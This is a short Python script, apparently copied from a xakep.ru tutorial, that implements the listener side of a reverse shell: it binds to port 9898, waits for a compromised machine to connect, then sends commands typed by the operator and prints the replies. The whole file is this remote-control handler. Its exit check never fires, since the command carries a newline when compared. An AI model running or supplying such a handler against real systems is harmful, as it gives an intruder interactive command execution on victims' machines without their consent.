#!/bin/python


#https://xakep.ru/2020/04/14/python-reverse-shell/#toc03.1

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 9898))
s.listen(5)

client, addr = s.accept()

while 1:
  command = str(input('Enter command:>')) + '\n'
  client.send(command.encode())
  if command.lower() == 'exit':
    break
  result_output = client.recv(4096).decode()
  print(result_output)
client.close()
s.close()